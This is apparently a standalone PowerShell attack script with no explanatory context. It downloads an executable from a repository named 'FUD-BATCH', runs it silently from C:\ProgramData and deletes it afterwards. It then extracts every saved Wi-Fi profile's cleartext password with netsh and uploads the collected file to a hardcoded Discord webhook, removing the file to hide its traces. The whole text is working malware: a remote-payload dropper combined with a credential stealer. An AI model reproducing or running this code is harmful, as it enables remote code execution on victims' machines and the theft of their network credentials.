# Suppress progress messages
$ProgressPreference = 'SilentlyContinue'

# URL to download the executable from
$downloadUrl = "https://raw.githubusercontent.com/altabross/FUD-BATCH/refs/heads/main/test.exe"
# Path to save the executable in C:\ProgramData
$exePath = "C:\ProgramData\test.exe" 

# Download the executable from the specified URL
Invoke-WebRequest -Uri $downloadUrl -OutFile $exePath

# Check if the download was successful
if (-Not (Test-Path $exePath)) {
    Write-Host "Failed to download the executable."
    exit
} else {
    Write-Host "Downloaded executable to $exePath"
}

# Execute the executable
Start-Process -FilePath $exePath -NoNewWindow -Wait

# Optional: Wait time to allow the process to run for 10 seconds
Start-Sleep -Seconds 10

# Clean up (delete the executable after execution)
Remove-Item -Path $exePath -Force -ErrorAction SilentlyContinue
Write-Host "Executed the executable and cleaned up."

# Discord webhook URL
$webhook = "https://discord.com/api/webhooks/1301990032567042159/PP7RFPrRII5BKybbo1-7o-YAxVRcdmZmzPMJEt6pcJaSoyc6aWhG4tEzAOeuJXhQRjnw"

# Output file to save Wi-Fi profiles and passwords
$outputFile = "C:\ProgramData\WifiPasswords.txt"

# Ensure the ProgramData directory exists
$programDataPath = "C:\ProgramData"
if (-Not (Test-Path $programDataPath)) {
    Write-Host "ProgramData folder does not exist. Exiting script."
    exit
}

# Create or clear the output file
if (Test-Path $outputFile) {
    Clear-Content -Path $outputFile
} else {
    New-Item -Path $outputFile -ItemType File | Out-Null
}

# Dump Wi-Fi profiles and passwords into the output file
Add-Content -Path $outputFile -Value "Wi-Fi Passwords Collected:`r`n------------------------------`r`n"
netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
    $profileName = $_ -replace ".*: ", ""
    $wifiDetails = netsh wlan show profile "$profileName" key=clear

    # Extract relevant details
    $ssid = $profileName
    $keyContentLine = $wifiDetails | Select-String "Key Content"
    $keyContent = if ($keyContentLine) { $keyContentLine -replace ".*: ", "" } else { "No Password Found" }

    # Additional information extraction
    $connectionModeLine = $wifiDetails | Select-String "Connection mode"
    $networkTypeLine = $wifiDetails | Select-String "Network type"
    $authTypeLine = $wifiDetails | Select-String "Authentication"
    $cipherLine = $wifiDetails | Select-String "Cipher"

    $connectionMode = if ($connectionModeLine) { $connectionModeLine -replace ".*: ", "" } else { "N/A" }
    $networkType = if ($networkTypeLine) { $networkTypeLine -replace ".*: ", "" } else { "N/A" }
    $authType = if ($authTypeLine) { $authTypeLine -replace ".*: ", "" } else { "N/A" }
    $cipher = if ($cipherLine) { $cipherLine -replace ".*: ", "" } else { "N/A" }

    # Append profile information to the output file
    Add-Content -Path $outputFile -Value @"
Profile Name: $profileName
SSID Name: $ssid
Key Content: $keyContent

Connection Mode: $connectionMode
Network Type: $networkType
Authentication Type: $authType
Cipher: $cipher
------------------------------
"@
}

# Function for sending the file to Discord Webhook
function Send-DiscordFile {
    param (
        [string]$filePath
    )

    # Read file content as string
    $fileContent = Get-Content -Path $filePath -Raw

    # Create the multipart body
    $boundary = [System.Guid]::NewGuid().ToString()
    $headers = @{ "Content-Type" = "multipart/form-data; boundary=$boundary" }

    # Build the body as a byte array
    $body = @()
    $body += "--$boundary`r`n"
    $body += "Content-Disposition: form-data; name=`"file`"; filename=`"WifiPasswords.txt`"`r`n"
    $body += "Content-Type: text/plain`r`n`r`n"
    $body += $fileContent
    $body += "`r`n--$boundary--`r`n"

    # Convert body to bytes
    $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($body -join '')

    try {
        Invoke-RestMethod -Uri $webhook -Method Post -Body $bodyBytes -Headers $headers
    } catch {
        Write-Host "Failed to send file to Discord: $_"
    }
}

# Send the output file
Send-DiscordFile -filePath $outputFile

# Clean up
Remove-Item $outputFile -Force
Write-Host "Sent Wi-Fi passwords and cleaned up."
